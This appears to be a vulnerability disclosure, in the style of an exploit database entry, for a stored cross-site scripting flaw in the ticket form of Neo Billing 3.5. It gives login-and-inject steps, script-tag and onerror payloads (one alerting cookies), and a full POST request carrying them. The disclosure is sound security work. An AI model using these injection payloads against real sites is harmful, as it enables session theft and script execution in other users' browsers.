@@ -1,0 +1,57 @@
+# Exploit Title: Neo Billing 3.5 - Stored Cross Site Scripting Vulnerability
+# Date: 18.8.2019.
+# Exploit Author: n1x_ [MS-WEB]
+# Vendor Homepage: https://codecanyon.net/item/neo-billing-accounting-invoicing-and-crm-software/20896547
+# Version: 3.5
+# CWE : CWE-79
+
+[Description]
+
+# Neo Billing os an accounting, invoicing and CRM PHP script, with over 500 installations.
+# Due to improper input fields data filtering, version 3.5 (and possibly previous versions), are affected by a stored XSS vulnerability. 
+
+[Proof of Concept]
+
+# 1. Authorization  as customer (regular user account) [//host/neo/crm/user/login]
+# 2. Closing an input field tag and injecting code into 'Subject' or 'Description' text fields [//host/neo/crm/tickets/addticket]
+# 3. The code is stored [//host/neo/crm/tickets] ∨ [//host/neo/crm/tickets/thread/?id=ticketid] 
+
+[Example paylods]
+
+# Example payload: "><img src="x" onerror="alert('XSS');">
+# Example payload: "><script>alert(document.cookie)</script>
+
+[POST Request]
+
+POST /neo/crm/tickets/addticket HTTP/1.1
+Host: host
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: //host/neo/crm/tickets/addticket
+Content-Type: multipart/form-data; boundary=---------------------------899768029113033755249127523
+Content-Length: 694
+Cookie: __cfduid=d99e93624fe63d5aa953bf59cd28cdafe1566123585; ci_sessions=nel35vfb2hi5f9tt29l43ogn36hdmilj
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+-----------------------------899768029113033755249127523
+Content-Disposition: form-data; name="title"
+ 
+"><script>alert('XSS')</script>
+-----------------------------899768029113033755249127523
+Content-Disposition: form-data; name="content"
+ 
+<p>"><script>alert('XSS')</script><br></p>
+-----------------------------899768029113033755249127523
+Content-Disposition: form-data; name="files"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------899768029113033755249127523
+Content-Disposition: form-data; name="userfile"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------899768029113033755249127523--
